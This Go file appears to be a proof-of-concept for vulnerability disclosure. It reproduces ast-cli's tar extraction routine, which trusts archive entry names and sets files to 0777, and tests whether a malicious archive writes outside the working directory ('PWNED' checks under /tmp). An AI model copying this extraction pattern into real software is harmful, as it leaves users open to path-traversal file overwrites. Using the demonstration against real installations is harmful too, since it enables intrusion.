// Same UnzipOrExtractFiles + extractFiles you have in ast-cli at
// internal/services/osinstaller/linux-mac-utils.go (tag 2.3.48).
// Only added a couple of fmt.Printf calls so the run output shows
// what is being created.
package main

import (
	"archive/tar"
	"compress/gzip"
	"fmt"
	"io"
	"io/fs"
	"log"
	"os"
	"path/filepath"
)

const dirDefault int = 0755

type InstallationConfiguration struct{ workingDir string }

func (c *InstallationConfiguration) WorkingDir() string { return c.workingDir }

func UnzipOrExtractFiles(c *InstallationConfiguration, tarPath string) error {
	gzipStream, err := os.Open(tarPath)
	if err != nil {
		return err
	}
	uncompressedStream, err := gzip.NewReader(gzipStream)
	if err != nil {
		return err
	}
	tarReader := tar.NewReader(uncompressedStream)
	return extractFiles(c, tarReader)
}

func extractFiles(c *InstallationConfiguration, tarReader *tar.Reader) error {
	for {
		header, err := tarReader.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			log.Fatalf("Next() failed: %s", err.Error())
		}

		switch header.Typeflag {
		case tar.TypeDir:
			fmt.Printf("[VULN] os.Mkdir(%q, 0755)\n", header.Name)
			os.Mkdir(header.Name, os.FileMode(dirDefault))
		case tar.TypeReg:
			extractedFilePath := filepath.Join(c.WorkingDir(), header.Name)
			fmt.Printf("[VULN] os.Create(%q)\n", extractedFilePath)
			outFile, err := os.Create(extractedFilePath)
			if err != nil {
				log.Fatalf("Create() failed: %s", err.Error())
			}
			io.Copy(outFile, tarReader)
			outFile.Close()
			os.Chmod(extractedFilePath, fs.ModePerm)
		}
	}
	return nil
}

func main() {
	if len(os.Args) < 2 {
		fmt.Println("usage: poc_extract_vulnerable <malicious.tar.gz>")
		os.Exit(1)
	}

	tmp, _ := os.MkdirTemp("", "cx-poc-workdir-")
	defer os.RemoveAll(tmp)
	cfg := &InstallationConfiguration{workingDir: tmp}
	fmt.Printf("[+] Simulated WorkingDir: %s\n", tmp)

	UnzipOrExtractFiles(cfg, os.Args[1])

	for _, p := range []string{"/tmp/cx_pwn_traversal_test", "/tmp/cx_pwn_traversal_dir"} {
		if info, err := os.Stat(p); err == nil {
			fmt.Printf("[!! PWNED] %s exists (mode=%v size=%d)\n", p, info.Mode(), info.Size())
		}
	}
}
